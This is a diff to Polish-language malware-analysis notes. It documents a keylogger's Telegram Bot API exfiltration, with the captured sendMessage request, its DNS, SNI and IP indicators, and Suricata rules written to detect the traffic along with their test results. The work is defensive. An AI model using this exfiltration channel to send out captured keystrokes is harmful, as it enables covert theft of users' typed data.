@@ -155,8 +155,37 @@ Zweryfikowane na żywych plikach:
 - `Keylog_Python_Xenotix` — ✅ xenotix_python_logger.py
 - `Keylog_Advanced_Pynput` + `Keylog_Advanced_Telegram` — ✅ keylogger.py / telegram_utils.py / config.py
 
+## Analiza dynamiczna — exfil Telegram (15.08)
+
+Przechwycono ruch keyloggera wysyłającego keystroki przez Telegram Bot API:
+
+```
+POST https://api.telegram.org/bot<TOKEN>/sendMessage   → 401 (fake token)
+DNS:  api.telegram.org
+TLS SNI: api.telegram.org
+IP:   149.154.166.110 (Telegram)
+```
+
+**Obserwacja:** payload (`chat_id` + `text` z keystrokami) jest **wewnątrz TLS** — bez MITM/deszyfracji
+widać tylko DNS + SNI + IP. Dlatego detekcja sieciowa = wskaźniki „weak" (każdy klient Telegrama
+też się łączy z `api.telegram.org`) → do korelacji z procesem/behaviorem.
+
+## Reguły Suricata (exfil Telegram)
+
+`/root/android-pipeline/tools/detection/keylogger_exfil.rules`:
+
+- `9000501` DNS `api.telegram.org` — ✅ zweryfikowane (offline na pcap).
+- `9000502` TLS SNI `api.telegram.org`.
+- `9000503` IP `149.154.0.0/16` (Telegram) — ✅ zweryfikowane.
+
+**Wynik offline (suricata -r telegram_exfil.pcap):**
+```
+[1:9000501] KEYLOGGER exfil - Telegram Bot API (DNS api.telegram.org)   ×4
+[1:9000503] KEYLOGGER exfil - połączenie do Telegram (149.154.0.0/16)    ×1
+```
+
 ## Next
 
-1. Dynamiczna analiza pynput/Telegram keyloggera (przechwycić ruch `api.telegram.org`).
-2. Suricata: reguła na exfil Telegram (`sendMessage`/`sendDocument` z hosta).
+1. ~~Dynamiczna analiza pynput/Telegram keyloggera~~ ✅ (zrobione — patrz wyżej).
+2. ~~Suricata: reguła na exfil Telegram~~ ✅ (`keylogger_exfil.rules`).
 3. Refog/Spyrix: pobrać trial i wyciągnąć IOCs (procesy/pliki/usługi) w sandboxie `.57`.
